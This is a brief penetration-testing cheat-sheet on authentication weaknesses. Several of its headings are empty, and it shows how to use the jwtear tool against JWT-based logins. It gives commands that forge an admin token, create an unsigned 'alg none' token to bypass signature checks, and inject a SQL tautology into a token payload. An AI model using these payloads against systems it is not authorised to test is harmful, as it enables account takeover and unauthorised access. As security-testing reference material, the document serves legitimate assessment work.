# Authentication

## Implementation errors

## OAuth token

## JWT

### Bruteforce the secret key



### Jwtear

Automated JWT vulnerabilities scan tool. Can be found [here](https://github.com/KINGSABRI/jwtear)

#### Create a signed token

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"HS256"}' --payload '{"login":"admin"}' --key '<key>'
```

#### Create a token without signature

```
jwtear --generate-token --header --header '{"typ":"JWT", "alg":"none"}' --payload '{"login":"admin"}'
```

#### Test for injection in parameters

```
jwtear --generate-token --header '{"typ":"JWT", "alg":"none"}' --payload $'{"login":"admin \' or \'a\'=\'a\'}'
```
